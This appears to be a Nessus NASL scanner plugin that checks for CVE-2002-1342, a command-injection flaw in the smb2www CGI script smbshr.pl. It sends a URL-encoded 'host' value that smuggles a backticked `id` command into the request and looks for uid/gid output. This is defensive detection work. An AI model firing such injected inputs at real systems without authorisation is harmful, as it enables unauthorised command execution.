if(description)
{
 script_id(11375);
 script_bugtraq_id(6313);
 script_version("$Revision: 1.7 $");
 script_cve_id("CVE-2002-1342");
 
 
 name["english"] = "smb2www remote command execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running smb2www - a SMB to WWW gateway.

There is a flaw in the version of this CGI which allows
anyone to execute arbitrary commands on this host by
sending a malformed argument to smbshr.pl, one of the components
of this solution.

Solution : Upgrade to the latest version
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "smb2www Command Execution";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

arg = "host=%22%20%2DFOOBAR%7Cecho%20%22%20Sharename%22%0Aecho%0Aecho%20%22%20%20SomeShare%20%20Disk%20%22%60id%60%20%23%22";


dirs = make_list("/samba");

foreach d (cgi_dirs())
{ 
 dirs = make_list(dirs, d, string(d, "/samba"));
}

foreach d (dirs)
{
 req = http_post(item:string(d, "/smbshr.pl"), port:port);
 idx = stridx(req, string("\r\n\r\n"));
 req = insstr(req, string("\r\nContent-Length: ", strlen(arg), "\r\n\r\n"), idx);
 req += arg;
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if ( res == NULL ) exit(0);
 
 if(egrep(pattern:"uid=[0-9].* gid=[0-9]", string:res) )
	{
 	security_hole(port);
	exit(0);
	}
}

